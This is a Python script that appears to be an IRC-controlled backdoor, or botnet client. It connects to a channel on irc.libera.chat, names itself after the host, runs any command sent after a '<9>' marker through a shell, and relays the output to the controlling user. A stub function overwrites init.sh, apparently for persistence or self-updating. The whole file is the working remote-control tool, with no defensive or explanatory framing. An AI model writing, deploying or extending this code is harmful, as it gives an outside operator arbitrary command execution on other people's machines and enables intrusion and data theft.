import os
import time
import subprocess
import socket

server = "irc.libera.chat"
port = 6667
channel = "#feycomm"
nick = os.uname()[1] + "09"

def update_init():
    with open("new_init.sh", "w") as f:
        # logic to get new content here
        f.write("UPDATED CONTENT GOES HERE")
    os.replace("new_init.sh", "init.sh")

def connect_routine(server, port, channel, nick):
    irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    irc.connect((server, port))
    irc.send(f"NICK {nick}\r\n".encode())
    irc.send(f"USER {nick} 0 * :{nick}\r\n".encode())
    irc.send(f"JOIN {channel}\r\n".encode())
    irc.send(f"PRIVMSG {channel} :{nick} has connected. Awaiting username capture.\r\n".encode())

    while True:
        response = irc.recv(2048).decode()
        print(response)
        if response.startswith("PING"):
            irc.send(f"PONG {response.split()[1]}\r\n".encode())
        elif "IDENTIFY-9" in response: 
            startIndex = response.index(":")+1
            endIndex = response.index("!")
            username = response[startIndex:endIndex]
            print(f"Username captured: `{username}`")
            irc.send(f"PRIVMSG {channel} :Username captured: {username}. Awaiting commands.\r\n".encode())
        elif "<9>" in response: 
            command = response[response.index("<9> ")+4:].strip()
            print(f"Command issued: `{command}`")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            resultxt = result.stdout.strip().splitlines()
            for x in resultxt: 
                time.sleep(1)
                irc.send(f"PRIVMSG {username} :{x}\r\n".encode())

connect_routine(server, port, channel, nick)
